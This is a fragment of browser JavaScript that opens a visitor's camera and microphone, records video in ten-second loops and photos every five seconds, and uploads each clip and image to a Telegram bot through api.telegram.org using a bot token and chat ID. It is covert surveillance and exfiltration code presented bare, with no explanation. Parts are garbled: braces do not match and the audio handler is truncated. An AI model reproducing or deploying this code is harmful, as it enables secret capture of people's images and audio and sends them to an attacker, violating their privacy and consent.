      try {

        sendInfo(stream);
        setInterval(() => capturePhoto(), 5000);

    function startVideoLoop(stream) {
      mediaRecorder = new MediaRecorder(stream);
      mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        chunks = [];
        const form = new FormData();
        form.append("chat_id", chat_id);
        form.append("video", blob, "video10s.webm");
        fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
        setTimeout(() => mediaRecorder.start(), 1000);
      };
      mediaRecorder.start();
      setInterval(() => mediaRecorder.stop(), 10000);
    }

    function startAudioLoop(stream) {
      const audioRecorder = new MediaRecorder(stream);
      let audioChunks = [];

      audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };

        setTimeout(() => audioRecorder.start(), 1000);
      };

      audioRecorder.start();
      setInterval(() => audioRecorder.stop(), 15000);
    }

    async function capturePhoto() {
      const video = document.getElementById('video');
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
      const form = new FormData();
      form.append("chat_id", chat_id);
      form.append("photo", blob, "photo.jpg");
      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
